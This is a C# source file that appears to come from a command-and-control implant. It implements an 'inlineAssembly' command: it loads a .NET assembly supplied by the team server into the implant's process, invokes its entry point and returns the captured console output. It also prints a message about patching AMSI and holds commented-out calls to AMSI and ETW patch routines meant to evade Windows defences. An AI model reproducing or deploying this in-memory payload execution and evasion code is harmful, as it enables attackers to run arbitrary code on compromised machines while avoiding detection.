using Engineer.Extra;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class InlineAssembly : EngineerCommand
    {
        //Goal is to allow the user to use the inline assembly feature to execute .net code in the engineers current process 
        public override string Name => "inlineAssembly";

        public override string Execute(EngineerTask task)
        {
            if (task.File.Length < 1)
            {
                return "error: " + "no assembly suppiled use the /file argument, file location should be on team server.";
            }
            task.Arguments.TryGetValue("/args", out string assemblyArgument);
            assemblyArgument = assemblyArgument.TrimStart(' ');
            assemblyArgument = assemblyArgument.TrimStart('\"');
            assemblyArgument = assemblyArgument.TrimEnd('\"');
            task.Arguments.TryGetValue("/clrVersion", out string clrversion);
            //set the console out and error to try and capture output from thread execution
            var stdOut = Console.Out;
            var stdErr = Console.Error;
            var ms = new MemoryStream();

            
            // use Console.SetOut() to redirect the output to a string
            StreamWriter writer = new StreamWriter(ms) {AutoFlush = true};

            //get the current Processes Console and set the SetOut and SetError to the stream writer
            Console.SetOut(writer);
            Console.SetError(writer);
            try
            {

                // check clr version installed on system
                string installedClr = Environment.Version.ToString();

                
                //moved this outside cause if the patch throws an error it stops the whole execution
                Console.WriteLine("[+]Patching AMSI");
                //Patch_AMSI patchObject = new Patch_AMSI();
                //Console.WriteLine(patchObject.Execute(null));
                //Patch_ETW patchetwObject = new Patch_ETW();
                //Console.WriteLine(patchetwObject.Execute(null));
            
                // debase64 encode assembly string into a byte array
                byte[] assemblyBytes = task.File;
                Assembly assembly = Assembly.Load(assemblyBytes);
                var clrVersion =  assembly.ImageRuntimeVersion;

                Console.WriteLine($"the clr version needed is {clrVersion} ");
                Console.WriteLine($"the installed versions is {installedClr}");

                assembly.EntryPoint.Invoke(null, new[] { $"{assemblyArgument}".Split() });
                writer.Flush();
            }
            catch (Exception e)
            {
                Console.WriteLine("error: " + e.Message);
            }
            finally
            {
                //reset the console out and error
                Console.SetOut(stdOut);
                Console.SetError(stdErr);
            }
            string Output = Encoding.UTF8.GetString(ms.ToArray());
            return Output;
        }
    }
}
